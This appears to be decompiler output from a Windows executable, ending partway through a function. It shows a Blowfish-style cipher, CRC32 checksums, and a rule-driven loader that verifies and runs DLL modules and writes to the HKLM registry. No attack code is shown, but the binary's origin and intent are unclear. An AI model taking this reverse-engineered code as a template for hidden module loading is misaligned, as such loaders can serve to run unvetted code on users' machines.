  uVar8 = uVar8 ^ (*(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar7 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4) ^ puVar1[5];
  uVar7 = uVar7 ^ (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[4];
  uVar8 = uVar8 ^ (*(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar7 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4) ^ puVar1[3];
  uVar7 = uVar7 ^ (*(int *)(iVar2 + 0x400 + (uVar8 >> 0x10 & 0xff) * 4) +
                   *(int *)(iVar2 + (uVar8 >> 0x18) * 4) ^
                  *(uint *)(iVar2 + 0x800 + (uVar8 >> 8 & 0xff) * 4)) +
                  *(int *)(iVar2 + 0xc00 + (uVar8 & 0xff) * 4) ^ puVar1[2];
  iVar3 = *(int *)(iVar2 + 0x400 + (uVar7 >> 0x10 & 0xff) * 4);
  iVar4 = *(int *)(iVar2 + (uVar7 >> 0x18) * 4);
  uVar5 = *(uint *)(iVar2 + 0x800 + (uVar7 >> 8 & 0xff) * 4);
  iVar2 = *(int *)(iVar2 + 0xc00 + (uVar7 & 0xff) * 4);
  uVar6 = puVar1[1];
  *param_1 = *puVar1 ^ uVar7;
  *param_2 = uVar8 ^ (iVar3 + iVar4 ^ uVar5) + iVar2 ^ uVar6;
  return;
}



void __thiscall FUN_00409900(void *this,int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  uint local_c;
  uint local_8;
  int local_4;
  
  iVar1 = 0;
  do {
                    // WARNING: Load size is inaccurate
    *(undefined4 *)(iVar1 + *this) = *(undefined4 *)((int)&DAT_00403040 + iVar1);
    iVar1 = iVar1 + 4;
  } while (iVar1 < 0x48);
  iVar1 = 0;
  do {
    iVar2 = 0x100;
    do {
      *(undefined4 *)(iVar1 + *(int *)((int)this + 4)) = *(undefined4 *)((int)&DAT_00403088 + iVar1)
      ;
      iVar1 = iVar1 + 4;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  } while (iVar1 < 0x1000);
  iVar1 = 0;
  local_4 = 0;
  do {
                    // WARNING: Load size is inaccurate
    *(uint *)(local_4 + *this) =
         *(uint *)(local_4 + *this) ^
         CONCAT31(CONCAT21(CONCAT11(*(undefined *)(iVar1 + param_1),
                                    *(undefined *)((iVar1 + 1) % param_2 + param_1)),
                           *(undefined *)((iVar1 + 2) % param_2 + param_1)),
                  *(undefined *)((iVar1 + 3) % param_2 + param_1));
    iVar1 = (iVar1 + 4) % param_2;
    local_4 = local_4 + 4;
  } while (local_4 < 0x48);
  iVar1 = 0;
  local_c = 0;
  local_8 = 0;
  do {
    FUN_00409100(this,&local_c,&local_8);
                    // WARNING: Load size is inaccurate
    *(uint *)(iVar1 + *this) = local_c;
                    // WARNING: Load size is inaccurate
    *(uint *)(iVar1 + 4 + *this) = local_8;
    iVar1 = iVar1 + 8;
  } while (iVar1 < 0x48);
  iVar1 = 4;
  do {
    iVar2 = 0x80;
    do {
      FUN_00409100(this,&local_c,&local_8);
      *(uint *)(iVar1 + -4 + *(int *)((int)this + 4)) = local_c;
      *(uint *)(iVar1 + *(int *)((int)this + 4)) = local_8;
      iVar1 = iVar1 + 8;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
  } while (iVar1 < 0x1004);
  return;
}



uint FUN_00409a30(uint param_1)

{
  if ((param_1 & 7) != 0) {
    param_1 = (param_1 - (param_1 & 7)) + 8;
  }
  return param_1;
}



uint __thiscall FUN_00409a50(void *this,uint *param_1,uint *param_2,uint param_3)

{
  uint *puVar1;
  uint *puVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  uint *puVar7;
  uint *puVar8;
  undefined4 *puVar9;
  int iVar10;
  bool bVar11;
  
  puVar7 = param_2;
  bVar11 = param_1 == param_2;
  puVar1 = (uint *)FUN_00409a30(param_3);
  param_2 = (uint *)0x0;
  if (puVar1 != (uint *)0x0) {
    puVar8 = param_1;
    param_1 = puVar7 + 1;
    do {
      if (bVar11) {
        if (param_2 < (uint *)(param_3 - 7)) {
          FUN_00409100(this,puVar8,puVar8 + 1);
          puVar8 = puVar8 + 2;
        }
        else {
          uVar4 = (int)puVar1 - param_3;
          if (0 < (int)uVar4) {
            puVar9 = (undefined4 *)((int)puVar8 + param_3);
            for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
              *puVar9 = 0;
              puVar9 = puVar9 + 1;
            }
            for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
              *(undefined *)puVar9 = 0;
              puVar9 = (undefined4 *)((int)puVar9 + 1);
            }
          }
          FUN_00409100(this,puVar8,puVar8 + 1);
          puVar8 = puVar8 + 2;
        }
      }
      else {
        if (param_2 < (uint *)(param_3 - 7)) {
          iVar10 = 8;
          puVar2 = puVar7;
          do {
            *(undefined *)puVar2 = *(undefined *)(((int)puVar8 - (int)puVar7) + (int)puVar2);
            puVar2 = (uint *)((int)puVar2 + 1);
            iVar10 = iVar10 + -1;
          } while (iVar10 != 0);
        }
        else {
          iVar3 = param_3 - (int)param_2;
          iVar10 = iVar3;
          iVar6 = 0;
          puVar2 = puVar7;
          if (0 < iVar3) {
            do {
              *(undefined *)puVar2 = *(undefined *)puVar8;
              puVar2 = (uint *)((int)puVar2 + 1);
              puVar8 = (uint *)((int)puVar8 + 1);
              iVar10 = iVar10 + -1;
            } while (iVar10 != 0);
            iVar6 = iVar3;
            if (7 < iVar3) goto LAB_00409b45;
          }
          for (uVar4 = 8U - iVar6 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
            *puVar2 = 0;
            puVar2 = puVar2 + 1;
          }
          for (uVar4 = 8U - iVar6 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
            *(undefined *)puVar2 = 0;
            puVar2 = (uint *)((int)puVar2 + 1);
          }
        }
LAB_00409b45:
        FUN_00409100(this,puVar7,param_1);
        puVar8 = puVar8 + 2;
        puVar7 = puVar7 + 2;
        param_1 = param_1 + 2;
      }
      param_2 = param_2 + 2;
    } while (param_2 < puVar1);
  }
  return (uint)puVar1;
}



void __thiscall FUN_00409b90(void *this,uint *param_1,uint *param_2,int param_3)

{
  int iVar1;
  uint *puVar2;
  uint *puVar3;
  uint *puVar4;
  bool bVar5;
  
  bVar5 = param_1 == param_2;
  if (param_3 != 0) {
    puVar3 = param_2 + 1;
    puVar2 = param_1 + 1;
    puVar4 = param_1;
    param_1 = (uint *)(param_3 + 7U >> 3);
    do {
      if (bVar5) {
        FUN_00409500(this,puVar4,puVar2);
      }
      else {
        iVar1 = 0;
        do {
          *(undefined *)(iVar1 + (int)param_2) = *(undefined *)(iVar1 + (int)puVar4);
          iVar1 = iVar1 + 1;
        } while (iVar1 < 8);
        FUN_00409500(this,param_2,puVar3);
        param_2 = param_2 + 2;
        puVar3 = puVar3 + 2;
      }
      puVar4 = puVar4 + 2;
      puVar2 = puVar2 + 2;
      param_1 = (uint *)((int)param_1 + -1);
    } while (param_1 != (uint *)0x0);
  }
  return;
}



void __thiscall FUN_00409c20(void *this,undefined4 param_1)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint *puVar4;
  
  *(undefined ***)this = &PTR_FUN_004011c8;
  uVar3 = 0;
  puVar4 = (uint *)((int)this + 8);
  do {
    iVar2 = 8;
    uVar1 = uVar3;
    do {
      if ((uVar1 & 1) == 0) {
        uVar1 = uVar1 >> 1;
      }
      else {
        uVar1 = uVar1 >> 1 ^ 0xedb88320;
      }
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    *puVar4 = uVar1;
    uVar3 = uVar3 + 1;
    puVar4 = puVar4 + 1;
  } while ((int)uVar3 < 0x100);
  *(undefined4 *)((int)this + 0x40c) = 0;
  *(undefined4 *)((int)this + 0x408) = 0;
  *(undefined4 *)((int)this + 0x410) = 0;
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 0x414) = param_1;
  return;
}



undefined4 * __thiscall FUN_00409c80(void *this,byte param_1)

{
  FUN_00409ca0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0041509e(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_00409ca0(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_004011c8;
  if ((LPVOID)param_1[0x102] != (LPVOID)0x0) {
    FUN_004150a9((LPVOID)param_1[0x102]);
  }
  param_1[0x102] = 0;
  param_1[0x103] = 0;
  param_1[0x104] = 0;
  param_1[1] = 0;
  return;
}



undefined4 __thiscall FUN_00409ce0(void *this,LPCSTR param_1)

{
  byte **ppbVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined uVar5;
  uint *puVar6;
  char *pcVar7;
  char local_100 [256];
  
  ppbVar1 = (byte **)FUN_004154e0(param_1,&DAT_004041b8);
  if (ppbVar1 == (byte **)0x0) {
    pcVar7 = s_Error_opening_file___s__for_read_00404190;
  }
  else {
    FUN_0041546e(local_100,(byte *)s_Opened_file___s__for_reading__00404170);
    FUN_004116e9(*(int *)((int)this + 0x414),extraout_DL_00,s_Checksum_00404158,s_Load_File_00404164
                 ,local_100);
    FUN_004153e2((char **)ppbVar1,0,2);
    iVar2 = FUN_0041528a((char **)ppbVar1);
    *(int *)((int)this + 0x40c) = iVar2;
    FUN_0041546e(local_100,(byte *)s_file_size_is__d_bytes__00404140);
    FUN_004116e9(*(int *)((int)this + 0x414),0,s_Checksum_00404158,s_Load_File_00404164,local_100);
    puVar6 = (uint *)(*(int *)((int)this + 0x40c) + 8);
    puVar3 = (undefined4 *)FUN_00415216(puVar6);
    *(undefined4 **)((int)this + 0x408) = puVar3;
    if (puVar3 != (undefined4 *)0x0) {
      for (uVar4 = (uint)puVar6 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
        *puVar3 = 0;
        puVar3 = puVar3 + 1;
      }
      for (uVar4 = (uint)puVar6 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
        *(undefined *)puVar3 = 0;
        puVar3 = (undefined4 *)((int)puVar3 + 1);
      }
      FUN_0041546e(local_100,(byte *)s_Allocated__ld_bytes_for_storing_f_004040f0);
      FUN_004116e9(*(int *)((int)this + 0x414),extraout_DL_01,s_Checksum_00404158,
                   s_Load_File_00404164,local_100);
      FUN_004153e2((char **)ppbVar1,0,0);
      uVar4 = FUN_0041512e(*(undefined4 **)((int)this + 0x408),1,*(uint *)((int)this + 0x40c),
                           ppbVar1);
      if (uVar4 == *(uint *)((int)this + 0x40c)) {
        FUN_004150d8((int *)ppbVar1);
        FUN_0041546e(local_100,(byte *)(s__successfully_read__ld_bytes_fro_00404087 + 1));
        FUN_004116e9(*(int *)((int)this + 0x414),0,s_Checksum_00404158,s_Load_File_00404164,
                     local_100);
        return 0;
      }
      FUN_0041546e(local_100,(byte *)s_error_reading_file___ld_bytes_re_004040bc);
      uVar5 = 0;
      goto LAB_00409e43;
    }
    pcVar7 = s_error_allocating__ld_bytes_for_f_00404118;
  }
  FUN_0041546e(local_100,(byte *)pcVar7);
  uVar5 = extraout_DL;
LAB_00409e43:
  FUN_004116e9(*(int *)((int)this + 0x414),uVar5,s_Checksum_00404158,s_Load_File_00404164,local_100)
  ;
  return 0xffffffff;
}



void __fastcall FUN_00409ec0(int param_1)

{
  uint uVar1;
  byte *pbVar2;
  int iVar3;
  
  pbVar2 = *(byte **)(param_1 + 0x408);
  uVar1 = 0xffffffff;
  for (iVar3 = *(int *)(param_1 + 0x40c); iVar3 != 0; iVar3 = iVar3 + -1) {
    uVar1 = uVar1 >> 8 ^ *(uint *)(param_1 + 8 + (uVar1 & 0xff ^ (uint)*pbVar2) * 4);
    pbVar2 = pbVar2 + 1;
  }
  *(undefined4 *)(param_1 + 0x410) = 1;
  *(uint *)(param_1 + 4) = ~uVar1;
  return;
}



void __thiscall FUN_00409f10(void *this,byte *param_1,int param_2)

{
  uint uVar1;
  
  uVar1 = 0xffffffff;
  *(byte **)((int)this + 0x408) = param_1;
  *(int *)((int)this + 0x40c) = param_2;
  if (param_2 != 0) {
    do {
      uVar1 = uVar1 >> 8 ^ *(uint *)((int)this + (uVar1 & 0xff ^ (uint)*param_1) * 4 + 8);
      param_1 = param_1 + 1;
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  *(undefined4 *)((int)this + 0x410) = 1;
  *(uint *)((int)this + 4) = ~uVar1;
  return;
}



bool __thiscall FUN_00409f60(void *this,int param_1)

{
  if (*(int *)((int)this + 0x410) == 0) {
    FUN_00409ec0((int)this);
  }
  return param_1 == *(int *)((int)this + 4);
}



void __thiscall FUN_00409f90(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0xc) = 0;
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined ***)this = &PTR_FUN_004011cc;
  *(undefined4 *)((int)this + 0x14) = param_1;
  return;
}



undefined4 * __thiscall FUN_00409fb0(void *this,byte param_1)

{
  FUN_00409fd0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0041509e(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_00409fd0(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_004011cc;
  if ((LPVOID)param_1[1] != (LPVOID)0x0) {
    FUN_004150a9((LPVOID)param_1[1]);
  }
  return;
}



uint __thiscall FUN_00409ff0(void *this,byte *param_1)

{
  uint uVar1;
  void *this_00;
  void *extraout_ECX;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  if (*(int *)((int)this + 0x10) != 0) {
    iVar2 = 0;
    this_00 = this;
    do {
      uVar1 = FUN_0041dd90(this_00,param_1,(byte *)(*(int *)((int)this + 4) + iVar2));
      if (uVar1 == 0) {
        return uVar3;
      }
      uVar3 = uVar3 + 1;
      iVar2 = iVar2 + 0x450;
      this_00 = extraout_ECX;
    } while (uVar3 < *(uint *)((int)this + 0x10));
  }
  return 0xffffffff;
}



undefined4 __thiscall FUN_0040a040(void *this,uint *param_1,undefined *param_2)

{
  uint *puVar1;
  int iVar2;
  uint *puVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  char local_100 [256];
  
  *param_2 = 0;
  *(undefined4 *)(param_2 + 0x40) = 0;
  param_2[0x44] = 0;
  *(undefined4 *)(param_2 + 0x444) = 0;
  *(undefined4 *)(param_2 + 0x448) = 0;
  *(undefined4 *)(param_2 + 0x44c) = 0xffffffff;
  puVar1 = FUN_00415540(param_1,'|');
  if (puVar1 == (uint *)0x0) {
    FUN_0041546e(local_100,(byte *)s_Error_finding_the_1st_delimiter_f_00404380);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL,s_ControlSet_00404368,s_Parse_Rule_00404374,
                 local_100);
    return 1;
  }
  *(undefined *)puVar1 = 0;
  iVar2 = FUN_004154f3(param_1,&DAT_00404364);
  if (iVar2 != 1) {
    FUN_0041546e(local_100,(byte *)s_Error_reading_the_1st_field___s__00404340);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_00,s_ControlSet_00404368,
                 s_Parse_Rule_00404374,local_100);
    return 2;
  }
  *(undefined *)puVar1 = 0x7c;
  FUN_0041546e(local_100,(byte *)s_Rule_name_is___s___0040432c);
  FUN_004116e9(*(int *)((int)this + 0x14),0,s_ControlSet_00404368,s_Parse_Rule_00404374,local_100);
  puVar3 = FUN_00415540((uint *)((int)puVar1 + 1),'|');
  if (puVar3 == (uint *)0x0) {
    FUN_0041546e(local_100,(byte *)s_Error_finding_the_2nd_delimiter_f_004042fc);
    FUN_004116e9(*(int *)((int)this + 0x14),0,s_ControlSet_00404368,s_Parse_Rule_00404374,local_100)
    ;
    return 3;
  }
  *(undefined *)puVar3 = 0;
  iVar2 = FUN_004154f3((uint *)((int)puVar1 + 1),&DAT_004042f8);
  if (iVar2 != 1) {
    FUN_0041546e(local_100,(byte *)s_Error_reading_the_2nd_field___s__004042d4);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_01,s_ControlSet_00404368,
                 s_Parse_Rule_00404374,local_100);
    return 4;
  }
  *(undefined *)puVar3 = 0x7c;
  FUN_0041546e(local_100,(byte *)s_Rule_version_is__d__004042bc);
  FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_02,s_ControlSet_00404368,s_Parse_Rule_00404374
               ,local_100);
  puVar1 = FUN_00415540((uint *)((int)puVar3 + 1),'|');
  if (puVar1 == (uint *)0x0) {
    FUN_0041546e(local_100,(byte *)s_Error_finding_the_3rd_delimiter_f_0040428c);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_03,s_ControlSet_00404368,
                 s_Parse_Rule_00404374,local_100);
    return 5;
  }
  *(undefined *)puVar1 = 0;
  iVar2 = FUN_004154f3((uint *)((int)puVar3 + 1),&DAT_00404364);
  if (iVar2 != 1) {
    FUN_0041546e(local_100,(byte *)s_Error_reading_the_3rd_field___s__00404268);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_04,s_ControlSet_00404368,
                 s_Parse_Rule_00404374,local_100);
    return 6;
  }
  *(undefined *)puVar1 = 0x7c;
  FUN_0041546e(local_100,(byte *)s_Rule_filename_is___s___00404250);
  FUN_004116e9(*(int *)((int)this + 0x14),0,s_ControlSet_00404368,s_Parse_Rule_00404374,local_100);
  iVar2 = FUN_004154f3((uint *)((int)puVar1 + 1),&DAT_0040424c);
  if (iVar2 != 1) {
    FUN_0041546e(local_100,(byte *)s_Error_reading_the_4th_field___s__00404228);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_05,s_ControlSet_00404368,
                 s_Parse_Rule_00404374,local_100);
    return 7;
  }
  FUN_0041546e(local_100,(byte *)s_Rule_checksum_is_0x__8x_____d_00404208);
  FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_06,s_ControlSet_00404368,s_Parse_Rule_00404374
               ,local_100);
  *(undefined4 *)(param_2 + 0x44c) = 0;
  return 0;
}



int __thiscall FUN_0040a3b0(void *this,uint *param_1)

{
  char cVar1;
  uint *puVar2;
  int iVar3;
  uint *puVar4;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  uint uVar5;
  uint *puVar6;
  int local_108;
  uint *local_104;
  char local_100 [256];
  
  local_108 = 0;
  puVar2 = FUN_00415540(param_1,'\0');
  if (*(char *)((int)puVar2 + -2) != '\r') {
    *(undefined *)puVar2 = 0xd;
    *(undefined *)((int)puVar2 + 1) = 10;
    *(undefined *)((int)puVar2 + 2) = 0;
  }
  puVar2 = FUN_00415540(param_1,'\r');
  if (puVar2 == (uint *)0x0) {
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL,s_ControlSet_00404368,
                 s_Parse_ControlSet_0040448c,s_Error_extracting_the_version_num_004044a0);
    local_108 = -1;
  }
  *(undefined *)puVar2 = 0;
  puVar6 = local_104;
  if (local_108 == 0) {
    iVar3 = FUN_004154f3(param_1,&DAT_004042f8);
    if (iVar3 != 1) {
      FUN_0041546e(local_100,(byte *)s_Error_parsing_rules_version_numb_00404458);
      FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_00,s_ControlSet_00404368,
                   s_Parse_ControlSet_0040448c,local_100);
      local_108 = -2;
    }
    FUN_0041546e(local_100,(byte *)s_Control_Set_version_number_is__d_00404434);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_01,s_ControlSet_00404368,
                 s_Parse_ControlSet_0040448c,local_100);
    if (local_108 == 0) {
      puVar6 = (uint *)((int)puVar2 + 2);
      local_104 = (uint *)0x0;
      puVar4 = FUN_00415540(puVar6,'\r');
      puVar2 = puVar6;
      while (puVar4 != (uint *)0x0) {
        iVar3 = -1;
        *(undefined *)puVar4 = 0;
        do {
          if (iVar3 == 0) break;
          iVar3 = iVar3 + -1;
          cVar1 = *(char *)puVar2;
          puVar2 = (uint *)((int)puVar2 + 1);
        } while (cVar1 != '\0');
        if (iVar3 != -2) {
          local_104 = (uint *)((int)local_104 + 1);
        }
        puVar2 = (uint *)((int)puVar4 + 2);
        puVar4 = FUN_00415540(puVar2,'\r');
      }
    }
  }
  *(uint **)((int)this + 0x10) = local_104;
  if (local_104 == (uint *)0x0) {
    return -3;
  }
  FUN_0041546e(local_100,(byte *)s__d_rules_contained_in_the_file__00404410);
  FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_02,s_ControlSet_00404368,
               s_Parse_ControlSet_0040448c,local_100);
  puVar2 = FUN_004155fc(*(int *)((int)this + 0x10),0x450);
  *(uint **)((int)this + 4) = puVar2;
  if (puVar2 != (uint *)0x0) {
    if (local_108 != 0) {
      return local_108;
    }
    uVar5 = 0;
    if (*(int *)((int)this + 0x10) != 0) {
      do {
        if (local_108 != 0) {
          return local_108;
        }
        puVar4 = FUN_00415540(puVar6,'\0');
        FUN_0041546e(local_100,(byte *)s_Parsing_rule__d_____s__from_the_r_004043b0);
        FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_04,s_ControlSet_00404368,
                     s_Parse_ControlSet_0040448c,local_100);
        local_108 = FUN_0040a040(this,puVar6,(undefined *)puVar2);
        puVar2 = puVar2 + 0x114;
        uVar5 = uVar5 + 1;
        puVar6 = (uint *)((int)puVar4 + 2);
      } while (uVar5 < *(uint *)((int)this + 0x10));
    }
    return local_108;
  }
  FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_03,s_ControlSet_00404368,
               s_Parse_ControlSet_0040448c,s_Error_allocating_memory_for_the_c_004043e0);
  return -4;
}



undefined4 __thiscall FUN_0040a610(void *this,int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined uVar3;
  undefined extraout_DL_03;
  char acStack_200 [256];
  char local_100 [256];
  
  *(undefined4 *)(param_1 + 0x44c) = 0xffffffff;
  FUN_0041546e(local_100,(byte *)s__s__s_0040460c);
  hModule = LoadLibraryA(local_100);
  if (hModule == (HMODULE)0x0) {
    GetLastError();
    FUN_0041546e(acStack_200,(byte *)s_Error__d_loading__s_module__vers_004045d0);
    FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL,s_ControlSet_00404368,
                 s_Process_Rule_004045c0,acStack_200);
    return 1;
  }
  pFVar1 = GetProcAddress(hModule,s_version_004045b8);
  if (pFVar1 == (FARPROC)0x0) {
    GetLastError();
    FUN_0041546e(acStack_200,(byte *)s_Error__d_retrieving_address_of_f_0040457c);
    uVar3 = extraout_DL_00;
  }
  else {
    iVar2 = (*pFVar1)();
    if (iVar2 == *(int *)(param_1 + 0x40)) {
      FUN_0041546e(acStack_200,(byte *)s_Module__s_version__d_loaded_into_0040450c);
      uVar3 = extraout_DL_02;
    }
    else {
      FUN_0041546e(acStack_200,(byte *)s_Module__s_reported_version__d__e_0040454c);
      uVar3 = extraout_DL_01;
    }
    FUN_004116e9(*(int *)((int)this + 0x14),uVar3,s_ControlSet_00404368,s_Process_Rule_004045c0,
                 acStack_200);
    pFVar1 = GetProcAddress(hModule,&DAT_00404504);
    if (pFVar1 != (FARPROC)0x0) {
      iVar2 = (*pFVar1)();
      *(int *)(param_1 + 0x44c) = iVar2;
      FUN_0041546e(acStack_200,(byte *)s_Module__s___main___returned__d__004044e0);
      FUN_004116e9(*(int *)((int)this + 0x14),extraout_DL_03,s_ControlSet_00404368,
                   s_Process_Rule_004045c0,acStack_200);
      FreeLibrary(hModule);
      return 0;
    }
    GetLastError();
    FUN_0041546e(acStack_200,(byte *)s_Error__d_retrieving_address_of_f_0040457c);
    uVar3 = 0;
  }
  FUN_004116e9(*(int *)((int)this + 0x14),uVar3,s_ControlSet_00404368,s_Process_Rule_004045c0,
               acStack_200);
  FreeLibrary(hModule);
  return 1;
}



int __thiscall FUN_0040a7e0(void *this,undefined4 param_1,LPCSTR param_2,LPCSTR param_3)

{
  bool bVar1;
  int iVar2;
  undefined3 extraout_var;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar3;
  int iVar4;
  undefined4 *unaff_FS_OFFSET;
  int local_934;
  uint local_930;
  undefined4 local_92c [2];
  char local_924 [256];
  undefined4 local_824 [262];
  char local_40c [1024];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041dee6;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  local_934 = 0;
  FUN_00409c20(local_824,*(undefined4 *)((int)this + 0x14));
  local_4 = 0;
  FUN_00412030(local_92c,*(undefined4 *)((int)this + 0x14));
  iVar4 = *(int *)((int)this + 4);
  local_4 = CONCAT31(local_4._1_3_,1);
  local_930 = 0;
  if (*(int *)((int)this + 0x10) != 0) {
    do {
      FUN_0041546e(local_40c,(byte *)s__s__s_0040460c);
      *(undefined4 *)(iVar4 + 0x44c) = 0xffffffff;
      iVar2 = FUN_00409ce0(local_824,local_40c);
      if (iVar2 == 0) {
        FUN_00409ec0((int)local_824);
        bVar1 = FUN_00409f60(local_824,*(int *)(iVar4 + 0x444));
        if (CONCAT31(extraout_var,bVar1) == 0) {
          FUN_0041546e(local_924,(byte *)s_Checksum_error_for_module__s__ve_00404628);
          uVar3 = extraout_DL_00;
          goto LAB_0040a8fd;
        }
        iVar2 = FUN_0040a610(this,iVar4);
        local_934 = local_934 + iVar2;
      }
      else {
        FUN_0041546e(local_924,(byte *)s_Error_loading_DLL_file___s__for_c_00404690);
        uVar3 = extraout_DL;
LAB_0040a8fd:
        FUN_004116e9(*(int *)((int)this + 0x14),uVar3,s_ControlSet_00404368,
                     s_Process_ControlSet_00404614,local_924);
      }
      iVar4 = iVar4 + 0x450;
      local_930 = local_930 + 1;
    } while (local_930 < *(uint *)((int)this + 0x10));
    if (local_934 != 0) goto LAB_0040a959;
  }
  FUN_004125fb(local_92c,(HKEY)0x80000002,param_2,param_3,*(undefined4 *)((int)this + 8));
LAB_0040a959:
  local_4 = local_4 & 0xffffff00;
  FUN_0041205e(local_92c);
  local_4 = 0xffffffff;
  FUN_00409ca0(local_824);
  *unaff_FS_OFFSET = local_c;
  return local_934;
}



uint __fastcall FUN_0040a9a0(int param_1,undefined param_2,undefined4 param_3)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  int iVar3;
  undefined extraout_DL;
  uint uVar4;
  int iVar5;
  uint uVar6;
  undefined4 *unaff_FS_OFFSET;
  char local_924 [256];
  char local_824 [1024];
  undefined4 local_424 [262];
  undefined4 local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041defb;
  local_c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_c;
  FUN_00409c20(local_424,*(undefined4 *)(param_1 + 0x14));
  iVar5 = 0;
  uVar4 = 0;
  uVar6 = 0;
  local_4 = 0;
  if (*(int *)(param_1 + 0x10) != 0) {
    do {
      FUN_0041546e(local_824,(byte *)s__s__s_0040460c);
      bVar1 = FUN_00413399(*(int *)(param_1 + 0x14),local_824);
      if (CONCAT31(extraout_var,bVar1) == 0) {
LAB_0040aa9d:
        uVar4 = uVar4 | 1 << ((byte)uVar6 & 0x1f);
      }
      else {
        iVar2 = FUN_00409ce0(local_424,local_824);
        if (iVar2 != 0) {
          FUN_0041546e(local_924,(byte *)s_Error_loading_DLL_file___s__for_c_00404690);
          FUN_004116e9(*(int *)(param_1 + 0x14),extraout_DL,s_ControlSet_00404368,
                       s_Verify_ControlSet_004046c8,local_924);
          goto LAB_0040aa9d;
        }
        iVar2 = FUN_00409ec0((int)local_424);
        iVar3 = *(int *)(param_1 + 4) + iVar5;
        if (iVar2 != *(int *)(iVar3 + 0x444)) {
          *(undefined4 *)(iVar3 + 0x448) = 0;
          goto LAB_0040aa9d;
        }
        *(undefined4 *)(iVar3 + 0x448) = 1;
      }
      uVar6 = uVar6 + 1;
      iVar5 = iVar5 + 0x450;
    } while (uVar6 < *(uint *)(param_1 + 0x10));
  }
  local_4 = 0xffffffff;
  FUN_00409ca0(local_424);
  *unaff_FS_OFFSET = local_c;
  return uVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0040aaf0(undefined4 param_1,int param_2,uint *param_3)

{
  undefined4 uVar1;
  bool bVar2;
  int iVar3;
  undefined3 extraout_var;
  byte **ppbVar4;
  uint *puVar5;
  uint *puVar6;
  uint *puVar7;
  void *this;
  uint uVar8;
  undefined uVar9;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  uint *puVar10;
  uint *puVar11;
  undefined4 *unaff_FS_OFFSET;
